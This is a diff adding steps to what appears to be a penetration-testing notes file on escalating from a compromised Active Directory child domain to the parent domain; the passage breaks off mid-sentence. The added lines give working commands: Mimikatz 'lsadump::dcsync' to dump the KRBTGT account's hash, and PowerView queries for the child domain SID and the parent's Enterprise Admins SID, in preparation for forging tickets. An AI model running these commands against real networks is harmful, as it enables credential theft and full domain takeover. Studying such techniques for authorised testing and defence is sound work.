@@ -12,4 +12,23 @@ The following is needed to carryon this attack:
 - The FQDN of the child domain.
 - The SID of the Enterprise Admins group of the root domain.
 - With this data collected, the attack can be performed with Mimikatz.
-(Note: This requires a compromise of the child domain, do not attempt if you did not compromise the domain as you would be stuck )
+(Note: This requires a compromise of the child domain, do not attempt if you did not compromise the domain as you would be stuck at first step - obtaining KRBTGT hash)
+
+-Dumping KRBTGT Account's NT Hash with mimikatz:
+```
+mimikatz.exe
+privilege::debug
+lsadump::dcsync /user:<domain>\krbtgt #Mark down the hashes
+```
+
+-Getting the child domain SID with PowerView:
+```
+Get-DomainSID
+```
+
+-Get SID of Enterprise Admins groups in parent domain using PowerView:
+```
+Get-DomainGroup -Domain <parentdomainname> -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+
+We also need to designate a target us
